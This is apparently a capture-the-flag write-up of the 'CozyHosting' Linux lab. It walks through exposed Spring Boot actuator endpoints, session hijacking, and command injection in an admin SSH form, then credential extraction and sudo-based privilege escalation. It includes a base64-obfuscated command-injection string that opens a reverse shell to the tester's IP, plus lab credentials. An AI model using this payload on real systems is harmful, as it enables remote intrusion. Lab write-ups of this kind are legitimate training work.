+++
title = 'CozyHosting'
description = 'Easy Linux'
writeup = true
hideMeta = true
+++

Nmap scan
![CozyHosting (Easy Linux).png](CozyHosting%20%28Easy%20Linux%29.png)

Website has a login page, home page is pretty static with nothing interesting

![CozyHosting (Easy Linux)-1.png](CozyHosting%20%28Easy%20Linux%29-1.png)

/error gives a 500 which is different to anything else - odd

tried vhost enumeration as well - no luck
no luck with default creds, common creds, looking at page source - no other endpoints that really have anything

no other ports or attack surface. Something to do with this 500 then?

![CozyHosting (Easy Linux)-2.png](CozyHosting%20%28Easy%20Linux%29-2.png)

Application must be using Spring Boot as the web framework - as the Whitelabel Error Page is what pops up on 404s

At /actuator - which is apparently a common sensitive endpoint exposed in spring boot websites by default
![CozyHosting (Easy Linux)-3.png](CozyHosting%20%28Easy%20Linux%29-3.png)

At /actuator/sessions

![CozyHosting (Easy Linux)-4.png](CozyHosting%20%28Easy%20Linux%29-4.png)

Looking at /actuator/mappings - there was an interesting endpoint

![CozyHosting (Easy Linux)-5.png](CozyHosting%20%28Easy%20Linux%29-5.png)

Pasting the session ID into the JSESSION cookie in the http requests, gives us access to the admin page
![CozyHosting (Easy Linux)-6.png](CozyHosting%20%28Easy%20Linux%29-6.png)

We have code exec as `ssh username@hostname` is the command being run with the user input not sanitised

![CozyHosting (Easy Linux)-7.png](CozyHosting%20%28Easy%20Linux%29-7.png)

![CozyHosting (Easy Linux)-8.png](CozyHosting%20%28Easy%20Linux%29-8.png)

`;{echo,-n,YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTk2LzkwMDEgMD4mMSAK}|{base64,-d}|bash;`

![CozyHosting (Easy Linux)-9.png](CozyHosting%20%28Easy%20Linux%29-9.png)
There is a .jar file in the /app directory. Download it to attacking machine - and extract content. Looking for postgres with recursive grep, we are able to find credentials for database.
![CozyHosting (Easy Linux)-10.png](CozyHosting%20%28Easy%20Linux%29-10.png)
`postgres`:`Vg&nvzAQ7XxR`

![CozyHosting (Easy Linux)-11.png](CozyHosting%20%28Easy%20Linux%29-11.png)

admin password cracks to:
`manchesterunited`

works for user josh

![CozyHosting (Easy Linux)-12.png](CozyHosting%20%28Easy%20Linux%29-12.png)

Priv esc was super easy - we can run ssh binary with sudo - going to gtfo bins there is a simple way to elevate to root

![Pasted image 20260112183813.png](Pasted%20image%2020260112183813.png)




